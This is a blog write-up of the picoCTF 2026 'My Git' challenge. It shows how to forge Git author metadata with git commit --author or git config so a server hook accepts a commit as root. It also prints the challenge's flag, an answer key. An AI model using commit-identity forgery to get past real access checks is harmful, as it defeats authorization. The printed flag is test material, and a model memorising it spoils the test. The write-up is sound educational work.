---
title: "picoCTF 2026 – General Skills: My Git"
date: 2026-03-10
categories:
  - Misc
tags:
  - Misc
  - picoCTF
collections:
  - picoCTF
---



{{< admonition tldr "TL;DR" >}}

**picoCTF 2026 – General Skills: My Git** is a misc challenge from **picoCTF**. In this challenge we are given access to a Git repository via SSH. In the repository there is only the file `README.md` which contains instructions on how to get the flag.

{{< /admonition >}}

## Overview

In this challenge we are given access to a Git repository via SSH. In the repository there is only the file `README.md` which contains instructions on how to get the flag.

The contents of the README state that:

```
Only flag.txt pushed by root:root@picoctf will be updated with the flag.
```

This indicates that the server has a **Git hook** that will check commit metadata. If the commit is made by **root user with email root@picoctf**, then the server will give a flag.

---

## Cloning Repository

The first step is to clone the repository from the server provided by the challenge.

```bash
git clone ssh://git@foggy-cliff.picoctf.net:50172/git/challenge.git
```

Once the clone is complete:

```bash
cd challenge
ls
```

Output:

```
README.md
```

View the contents of the README file:

```bash
cat README.md
```

Output:

```
# MyGit

If you want the flag, make sure to push the flag!

Only flag.txt pushed by root:root@picoctf will be updated with the flag.
```

---

## Technical Analysis Challenge

These instructions indicate that the server may be checked for:

* **Author name**
* **Author email**
* **Pushed file name ( `flag.txt` )**

The problem is that **Git author metadata can be easily faked**, so we can impersonate user `root` .

---

## Exploitation

First we create the file `flag.txt` .

```bash
echo test > flag.txt
```

Add the file to Git.

```bash
git add flag.txt
```

Then commit with a **fake author** that matches the challenge requirements.

```bash
git commit --author="root <root@picoctf>" -m "add flag"
```

Or by changing the Git configuration:

```bash
git config user.name root
git config user.email root@picoctf
```

Then commit:

```bash
git commit -m "add flag"
```

After that push the commit to the server:

```bash
git push
```

When the push is performed, the server detects that the commit was created by `root@picoctf` and the file `flag.txt` is in that commit.

Output from server:

```
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_e522152d}
```

---

## Final Flags

```
picoCTF{1mp3rs0n4t4_g17_345y_e522152d}
```

---

## Key Takeaways

* **Git metadata such as author name and email can be faked easily.**
* Systems that rely on Git metadata for authentication can be vulnerable to **impersonation attacks**.
* The server may use **Git hook** to check incoming commits.
* In CTF, understanding how Git works internally can help find security holes.
